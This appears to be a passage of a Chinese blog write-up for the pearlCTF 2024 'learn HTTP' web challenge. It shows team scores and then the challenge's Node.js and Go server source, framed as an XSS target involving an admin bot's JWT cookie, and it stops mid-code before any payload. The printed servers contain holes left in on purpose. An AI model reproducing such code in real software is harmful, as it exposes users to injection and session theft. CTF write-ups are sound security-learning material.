@@ -1,0 +1,381 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="印度理工办的ctf，跟着很厉害的人一起做的"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="canonical" href="https://osthing.github.io/blog/prealctf2024-wp"><link rel="alternate" type="application/rss+xml" title="oSthing's blog" href="/rss.xml"><meta name="generator" content="Astro v5.18.2"><title>prealCTF2024 wp — oSthing&#39;s blog</title><meta property="og:type" content="website"><meta property="og:title" content="prealCTF2024 wp — oSthing's blog"><meta property="og:description" content="印度理工办的ctf，跟着很厉害的人一起做的"><meta property="og:url" content="https://osthing.github.io/blog/prealctf2024-wp"><meta property="og:image" content="https://osthing.github.io/og-default.png"><meta property="og:site_name" content="oSthing's blog"><meta property="og:locale" content="zh-CN"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="prealCTF2024 wp — oSthing's blog"><meta name="twitter:description" content="印度理工办的ctf，跟着很厉害的人一起做的"><meta name="twitter:image" content="https://osthing.github.io/og-default.png"><link rel="preconnect" href="https://rsms.me/"><link rel="stylesheet" href="https://rsms.me/inter/inter.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/JetBrains/JetBrainsMono@v2.304/web/css/jetbrains-mono.css"><link rel="stylesheet" href="/_astro/_slug_.AMwGTgR1.css"></head> <body class="min-h-screen flex flex-col bg-bg-light dark:bg-bg-dark text-fg-light dark:text-fg-dark antialiased"> <script>
+  (function () {
+    try {
+      const stored = localStorage.getItem('theme');
+      const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+      const theme = stored ?? (prefersDark ? 'dark' : 'light');
+      if (theme === 'dark') {
+        document.documentElement.classList.add('dark');
+      }
+    } catch (_) {
+      /* no-op */
+    }
+  })();
+</script> <header class="border-b border-border-light dark:border-border-dark sticky top-0 z-30 bg-bg-light/80 dark:bg-bg-dark/80 backdrop-blur"> <div class="mx-auto flex w-full max-w-6xl items-center justify-between px-6 py-4"> <a href="/" class="flex items-center gap-2 font-mono text-sm font-medium tracking-tight"> <span class="inline-flex h-2 w-2 rounded-full bg-accent-light dark:bg-accent-dark"></span> <span>osthing&#39;s blog</span> </a> <nav class="hidden md:flex items-center gap-1 text-sm"> <a href="/" class="rounded-md px-3 py-1.5 transition-colors text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark"> home </a><a href="/blog" class="rounded-md px-3 py-1.5 transition-colors text-fg-light dark:text-fg-dark"> blog </a><a href="/projects" class="rounded-md px-3 py-1.5 transition-colors text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark"> projects </a><a href="/links" class="rounded-md px-3 py-1.5 transition-colors text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark"> links </a><a href="/about" class="rounded-md px-3 py-1.5 transition-colors text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark"> about </a><a href="/contact" class="rounded-md px-3 py-1.5 transition-colors text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark"> contact </a> </nav> <div class="flex items-center gap-2 text-sm text-muted-light dark:text-muted-dark"> <a href="https://github.com/oSthing" rel="noopener noreferrer" target="_blank" class="rounded-md px-2 py-1 hover:text-fg-light dark:hover:text-fg-dark"> GitHub </a><a href="/rss.xml" rel="noopener noreferrer" class="rounded-md px-2 py-1 hover:text-fg-light dark:hover:text-fg-dark"> RSS </a> <button id="theme-toggle" type="button" aria-label="Toggle theme" class="rounded-md p-2 text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark transition-colors"> <svg class="hidden dark:block h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <circle cx="12" cy="12" r="4"></circle> <path d="M12 2v2"></path> <path d="M12 20v2"></path> <path d="m4.93 4.93 1.41 1.41"></path> <path d="m17.66 17.66 1.41 1.41"></path> <path d="M2 12h2"></path> <path d="M20 12h2"></path> <path d="m6.34 17.66-1.41 1.41"></path> <path d="m19.07 4.93-1.41 1.41"></path> </svg> <svg class="block dark:hidden h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path> </svg> </button> <script type="module">const e=document.getElementById("theme-toggle");e?.addEventListener("click",()=>{const t=document.documentElement.classList.toggle("dark");try{localStorage.setItem("theme",t?"dark":"light")}catch{}});</script> </div> </div>  </header> <main class="flex-1 w-full">  <article class="mx-auto w-full max-w-5xl px-6 py-16"> <header class="mb-12 border-b border-border-light dark:border-border-dark pb-8"> <div class="mb-3 flex items-center gap-2 text-sm text-muted-light dark:text-muted-dark"> <time datetime="2024-07-14T00:00:00.000Z">2024年7月14日</time> <span aria-hidden="true">·</span> <span>4 min read</span> </div> <h1 class="text-4xl font-semibold tracking-tight md:text-5xl">prealCTF2024 wp</h1> <p class="mt-4 text-lg text-muted-light dark:text-muted-dark">印度理工办的ctf，跟着很厉害的人一起做的</p> <div class="mt-4 flex flex-wrap gap-2"> <span class="rounded-full border border-border-light dark:border-border-dark px-2.5 py-0.5 text-xs"> ctf </span><span class="rounded-full border border-border-light dark:border-border-dark px-2.5 py-0.5 text-xs"> web </span><span class="rounded-full border border-border-light dark:border-border-dark px-2.5 py-0.5 text-xs"> writeup </span><span class="rounded-full border border-border-light dark:border-border-dark px-2.5 py-0.5 text-xs"> match </span> </div> </header> <div class="grid gap-12 md:grid-cols-[minmax(0,1fr)_240px]"> <div class="prose prose-neutral dark:prose-invert max-w-none">  <blockquote>
+<p>teamName: Ciallo～(∠・ω&#x3C; )⌒☆</p>
+<p>rank: #6</p>
+<p>points:  7575</p>
+<p>Reversing: 1474/7575</p>
+<p>Miscellaneous: 438/7575</p>
+<p>Crypto: 1,248/7575</p>
+<p>Forensics: 904/7575</p>
+<p>Web: 1169/7575</p>
+<p>Blockchain: 788/7575</p>
+<p>OSINT: 100/7575</p>
+<p>Pwn: 1454/7575</p>
+</blockquote>
+<p>这次比赛收获很多，也是和一群很强的师傅打，也感受到了自己确实很菜;w;</p>
+<h2 id="learn-http76-solves50-points"><strong>learn HTTP</strong>(76 Solves/50 Points)</h2>
+<p><a href="https://learn-http.ctf.pearlctf.in">https://learn-http.ctf.pearlctf.in</a></p>
+<p>给的是一个公共靶机里面有一个机器人那大概率是xss了，题目还给了附件，先简单看一下页面，看看题目要我们干什么，里面要我们写一个类似http请求的东西，然后把生成好的payload交给机器人检查，接下来我们看一下源码</p>
+<p>先看一下nodejs的源码</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#768390">//main.js</span></span>
+<span class="line"><span style="color:#DCBDFB">require</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">'dotenv'</span><span style="color:#ADBAC7">).</span><span style="color:#DCBDFB">config</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">const</span><span style="color:#6CB6FF"> childProcess</span><span style="color:#F47067"> =</span><span style="color:#DCBDFB"> require</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">'child_process'</span><span style="color:#ADBAC7">);</span></span>
+<span class="line"><span style="color:#F47067">var</span><span style="color:#ADBAC7"> jwt </span><span style="color:#F47067">=</span><span style="color:#DCBDFB"> require</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">'jsonwebtoken'</span><span style="color:#ADBAC7">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">const</span><span style="color:#6CB6FF"> express</span><span style="color:#F47067"> =</span><span style="color:#DCBDFB"> require</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"express"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#F47067">const</span><span style="color:#6CB6FF"> path</span><span style="color:#F47067"> =</span><span style="color:#DCBDFB"> require</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"path"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#F47067">const</span><span style="color:#6CB6FF"> bodyParser</span><span style="color:#F47067"> =</span><span style="color:#DCBDFB"> require</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"body-parser"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#F47067">var</span><span style="color:#ADBAC7"> cookieParser </span><span style="color:#F47067">=</span><span style="color:#DCBDFB"> require</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">'cookie-parser'</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">const</span><span style="color:#6CB6FF"> app</span><span style="color:#F47067"> =</span><span style="color:#DCBDFB"> express</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">app.</span><span style="color:#DCBDFB">use</span><span style="color:#ADBAC7">(express.</span><span style="color:#DCBDFB">static</span><span style="color:#ADBAC7">(path.</span><span style="color:#DCBDFB">join</span><span style="color:#ADBAC7">(__dirname, </span><span style="color:#96D0FF">'public'</span><span style="color:#ADBAC7">)))</span></span>
+<span class="line"><span style="color:#ADBAC7">app.</span><span style="color:#DCBDFB">use</span><span style="color:#ADBAC7">(bodyParser.</span><span style="color:#DCBDFB">urlencoded</span><span style="color:#ADBAC7">({ extended: </span><span style="color:#6CB6FF">false</span><span style="color:#ADBAC7"> }))</span></span>
+<span class="line"><span style="color:#ADBAC7">app.</span><span style="color:#DCBDFB">use</span><span style="color:#ADBAC7">(</span><span style="color:#DCBDFB">cookieParser</span><span style="color:#ADBAC7">())</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">app.</span><span style="color:#DCBDFB">get</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"/"</span><span style="color:#ADBAC7">, (</span><span style="color:#F69D50">req</span><span style="color:#ADBAC7">, </span><span style="color:#F69D50">res</span><span style="color:#ADBAC7">) </span><span style="color:#F47067">=></span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">    res.</span><span style="color:#DCBDFB">sendFile</span><span style="color:#ADBAC7">(path.</span><span style="color:#DCBDFB">join</span><span style="color:#ADBAC7">(__dirname, </span><span style="color:#96D0FF">"templates/index.html"</span><span style="color:#ADBAC7">))</span></span>
+<span class="line"><span style="color:#ADBAC7">})</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">const</span><span style="color:#DCBDFB"> genToken</span><span style="color:#F47067"> =</span><span style="color:#ADBAC7"> () </span><span style="color:#F47067">=></span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#F47067">    var</span><span style="color:#ADBAC7"> token </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> jwt.</span><span style="color:#DCBDFB">sign</span><span style="color:#ADBAC7">({ id: </span><span style="color:#6CB6FF">1</span><span style="color:#ADBAC7"> }, process.env.</span><span style="color:#6CB6FF">SECRET</span><span style="color:#ADBAC7">);</span></span>
+<span class="line"><span style="color:#F47067">    return</span><span style="color:#ADBAC7"> token</span></span>
+<span class="line"><span style="color:#ADBAC7">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">app.</span><span style="color:#DCBDFB">post</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"/check"</span><span style="color:#ADBAC7">, (</span><span style="color:#F69D50">req</span><span style="color:#ADBAC7">, </span><span style="color:#F69D50">res</span><span style="color:#ADBAC7">) </span><span style="color:#F47067">=></span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#F47067">    try</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#F47067">        let</span><span style="color:#ADBAC7"> req_body </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> req.body.body</span></span>
+<span class="line"><span style="color:#ADBAC7">        </span></span>
+<span class="line"><span style="color:#F47067">        if</span><span style="color:#ADBAC7"> (req_body </span><span style="color:#F47067">==</span><span style="color:#6CB6FF"> undefined</span><span style="color:#ADBAC7">) {</span></span>
+<span class="line"><span style="color:#F47067">            return</span><span style="color:#ADBAC7"> res.</span><span style="color:#DCBDFB">status</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">200</span><span style="color:#ADBAC7">).</span><span style="color:#DCBDFB">send</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Body is not provided"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">        let</span><span style="color:#ADBAC7"> to_req </span><span style="color:#F47067">=</span><span style="color:#96D0FF"> `http://localhost:5001/resp?body=${</span><span style="color:#DCBDFB">encodeURIComponent</span><span style="color:#96D0FF">(</span><span style="color:#ADBAC7">req_body</span><span style="color:#96D0FF">)</span><span style="color:#96D0FF">}`</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">        childProcess.</span><span style="color:#DCBDFB">spawn</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">'node'</span><span style="color:#ADBAC7">, [</span><span style="color:#96D0FF">'./bot.js'</span><span style="color:#ADBAC7">, </span><span style="color:#6CB6FF">JSON</span><span style="color:#ADBAC7">.</span><span style="color:#DCBDFB">stringify</span><span style="color:#ADBAC7">({</span></span>
+<span class="line"><span style="color:#ADBAC7">            url: to_req,</span></span>
+<span class="line"><span style="color:#ADBAC7">            token: </span><span style="color:#DCBDFB">genToken</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#ADBAC7">        })]);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">        return</span><span style="color:#ADBAC7"> res.</span><span style="color:#DCBDFB">status</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">200</span><span style="color:#ADBAC7">).</span><span style="color:#DCBDFB">send</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Admin will check!"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">    } </span><span style="color:#F47067">catch</span><span style="color:#ADBAC7"> (e) {</span></span>
+<span class="line"><span style="color:#ADBAC7">        console.</span><span style="color:#DCBDFB">log</span><span style="color:#ADBAC7">(e)</span></span>
+<span class="line"><span style="color:#F47067">        return</span><span style="color:#ADBAC7"> res.</span><span style="color:#DCBDFB">status</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">500</span><span style="color:#ADBAC7">).</span><span style="color:#DCBDFB">send</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Internal Server Error"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">    }</span></span>
+<span class="line"><span style="color:#ADBAC7">})</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">app.</span><span style="color:#DCBDFB">get</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"/flag"</span><span style="color:#ADBAC7">, (</span><span style="color:#F69D50">req</span><span style="color:#ADBAC7">, </span><span style="color:#F69D50">res</span><span style="color:#ADBAC7">) </span><span style="color:#F47067">=></span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#F47067">    let</span><span style="color:#ADBAC7"> token </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> req.cookies.token</span></span>
+<span class="line"><span style="color:#F47067">    try</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#F47067">        var</span><span style="color:#ADBAC7"> decoded </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> jwt.</span><span style="color:#DCBDFB">verify</span><span style="color:#ADBAC7">(token, process.env.</span><span style="color:#6CB6FF">SECRET</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#F47067">        if</span><span style="color:#ADBAC7"> (decoded.id </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> 2</span><span style="color:#ADBAC7">) {</span></span>
+<span class="line"><span style="color:#F47067">            return</span><span style="color:#ADBAC7"> res.</span><span style="color:#DCBDFB">status</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">200</span><span style="color:#ADBAC7">).</span><span style="color:#DCBDFB">send</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"You are not verified"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">        return</span><span style="color:#ADBAC7"> res.</span><span style="color:#DCBDFB">status</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">200</span><span style="color:#ADBAC7">).</span><span style="color:#DCBDFB">send</span><span style="color:#ADBAC7">(process.env.</span><span style="color:#6CB6FF">FLAG</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">    } </span><span style="color:#F47067">catch</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#F47067">        return</span><span style="color:#ADBAC7"> res.</span><span style="color:#DCBDFB">status</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">200</span><span style="color:#ADBAC7">).</span><span style="color:#DCBDFB">send</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"You are not verified"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">    }</span></span>
+<span class="line"><span style="color:#ADBAC7">})</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">app.</span><span style="color:#DCBDFB">listen</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"5000"</span><span style="color:#ADBAC7">, () </span><span style="color:#F47067">=></span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">    console.</span><span style="color:#DCBDFB">log</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Server started"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">})</span></span></code></pre>
+<p>有三个路由，逻辑都很简单， <code>/</code>就是显示主页，<code>/check</code>检查你构造的payload，并带上cookie(token)，<code>/flag</code>检查你的token  有没有修改如果有就返回flag</p>
+<p>然后我们开看看另一个go的源码</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="go"><code><span class="line"><span style="color:#F47067">package</span><span style="color:#F69D50"> main</span></span>
+<span class="line"><span style="color:#F47067">import</span><span style="color:#ADBAC7"> (</span></span>
+<span class="line"><span style="color:#96D0FF">	"</span><span style="color:#F69D50">fmt</span><span style="color:#96D0FF">"</span></span>
+<span class="line"><span style="color:#96D0FF">	"</span><span style="color:#F69D50">net</span><span style="color:#96D0FF">"</span></span>
+<span class="line"><span style="color:#96D0FF">	"</span><span style="color:#F69D50">os</span><span style="color:#96D0FF">"</span></span>
+<span class="line"><span style="color:#96D0FF">	"</span><span style="color:#F69D50">strings</span><span style="color:#96D0FF">"</span></span>
+<span class="line"><span style="color:#96D0FF">	"</span><span style="color:#F69D50">net/url</span><span style="color:#96D0FF">"</span></span>
+<span class="line"><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#F47067">const</span><span style="color:#ADBAC7"> (</span></span>
+<span class="line"><span style="color:#6CB6FF">	SERVER_HOST</span><span style="color:#F47067"> =</span><span style="color:#96D0FF"> "localhost"</span></span>
+<span class="line"><span style="color:#6CB6FF">	SERVER_PORT</span><span style="color:#F47067"> =</span><span style="color:#96D0FF"> "5001"</span></span>
+<span class="line"><span style="color:#6CB6FF">	SERVER_TYPE</span><span style="color:#F47067"> =</span><span style="color:#96D0FF"> "tcp"</span></span>
+<span class="line"><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#F47067">func</span><span style="color:#DCBDFB"> main</span><span style="color:#ADBAC7">() {</span></span>
+<span class="line"><span style="color:#ADBAC7">	fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Server Running..."</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">	server, err </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> net.</span><span style="color:#DCBDFB">Listen</span><span style="color:#ADBAC7">(SERVER_TYPE, SERVER_HOST</span><span style="color:#F47067">+</span><span style="color:#96D0FF">":"</span><span style="color:#F47067">+</span><span style="color:#ADBAC7">SERVER_PORT)</span></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> err </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> nil</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Error listening:"</span><span style="color:#ADBAC7">, err.</span><span style="color:#DCBDFB">Error</span><span style="color:#ADBAC7">())</span></span>
+<span class="line"><span style="color:#ADBAC7">		os.</span><span style="color:#DCBDFB">Exit</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">1</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"><span style="color:#F47067">	defer</span><span style="color:#ADBAC7"> server.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Listening on "</span><span style="color:#F47067"> +</span><span style="color:#ADBAC7"> SERVER_HOST </span><span style="color:#F47067">+</span><span style="color:#96D0FF"> ":"</span><span style="color:#F47067"> +</span><span style="color:#ADBAC7"> SERVER_PORT)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">	for</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		connection, err </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> server.</span><span style="color:#DCBDFB">Accept</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#F47067">		if</span><span style="color:#ADBAC7"> err </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> nil</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">			fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Error accepting: "</span><span style="color:#ADBAC7">, err.</span><span style="color:#DCBDFB">Error</span><span style="color:#ADBAC7">())</span></span>
+<span class="line"><span style="color:#ADBAC7">		}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">		go</span><span style="color:#DCBDFB"> processClient</span><span style="color:#ADBAC7">(connection)</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"><span style="color:#ADBAC7">}</span></span>
+<span class="line"><span style="color:#F47067">func</span><span style="color:#DCBDFB"> processClient</span><span style="color:#ADBAC7">(</span><span style="color:#F69D50">connection</span><span style="color:#F69D50"> net</span><span style="color:#ADBAC7">.</span><span style="color:#F69D50">Conn</span><span style="color:#ADBAC7">) {</span></span>
+<span class="line"><span style="color:#ADBAC7">	buffer </span><span style="color:#F47067">:=</span><span style="color:#DCBDFB"> make</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">, </span><span style="color:#6CB6FF">1024</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">	mLen, err </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Read</span><span style="color:#ADBAC7">(buffer)</span></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> err </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> nil</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Error reading:"</span><span style="color:#ADBAC7">, err.</span><span style="color:#DCBDFB">Error</span><span style="color:#ADBAC7">())</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"><span style="color:#ADBAC7">	raw_http_req </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> strings.</span><span style="color:#DCBDFB">Split</span><span style="color:#ADBAC7">(</span><span style="color:#F47067">string</span><span style="color:#ADBAC7">(buffer[:mLen]), </span><span style="color:#96D0FF">"</span><span style="color:#F47067">\r\n</span><span style="color:#96D0FF">"</span><span style="color:#ADBAC7">)[</span><span style="color:#6CB6FF">0</span><span style="color:#ADBAC7">]</span></span>
+<span class="line"><span style="color:#ADBAC7">	splitted_req </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> strings.</span><span style="color:#DCBDFB">Split</span><span style="color:#ADBAC7">(raw_http_req, </span><span style="color:#96D0FF">" "</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> splitted_req[</span><span style="color:#6CB6FF">0</span><span style="color:#ADBAC7">] </span><span style="color:#F47067">!=</span><span style="color:#96D0FF"> "GET"</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		_, err </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Write</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"HTTP/1.1 405 Method Not Allowed</span><span style="color:#F47067">\r\n\r\n</span><span style="color:#96D0FF">Can only GET"</span><span style="color:#ADBAC7">))</span></span>
+<span class="line"><span style="color:#ADBAC7">		connection.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#F47067">		return</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	parsed, err </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> url.</span><span style="color:#DCBDFB">Parse</span><span style="color:#ADBAC7">(splitted_req[</span><span style="color:#6CB6FF">1</span><span style="color:#ADBAC7">])</span></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> err </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> nil</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Error parsing: "</span><span style="color:#ADBAC7">, err.</span><span style="color:#DCBDFB">Error</span><span style="color:#ADBAC7">())</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	path </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> parsed.Path</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> path </span><span style="color:#F47067">!=</span><span style="color:#96D0FF"> "/resp"</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		_, err </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Write</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"HTTP/1.1 404 Not Found</span><span style="color:#F47067">\r\n\r\n</span><span style="color:#96D0FF">Not Found"</span><span style="color:#ADBAC7">))</span></span>
+<span class="line"><span style="color:#ADBAC7">		connection.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#F47067">		return</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"><span style="color:#ADBAC7">	</span></span>
+<span class="line"><span style="color:#ADBAC7">	args, err </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> url.</span><span style="color:#DCBDFB">ParseQuery</span><span style="color:#ADBAC7">(parsed.RawQuery)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> err </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> nil</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		_, err </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Write</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"HTTP/1.1 500 Internal Server Error</span><span style="color:#F47067">\r\n\r\n</span><span style="color:#96D0FF">Error"</span><span style="color:#ADBAC7">))</span></span>
+<span class="line"><span style="color:#ADBAC7">		connection.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#F47067">		return</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	body, ok </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> args[</span><span style="color:#96D0FF">"body"</span><span style="color:#ADBAC7">]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#F47067"> !</span><span style="color:#ADBAC7">ok {</span></span>
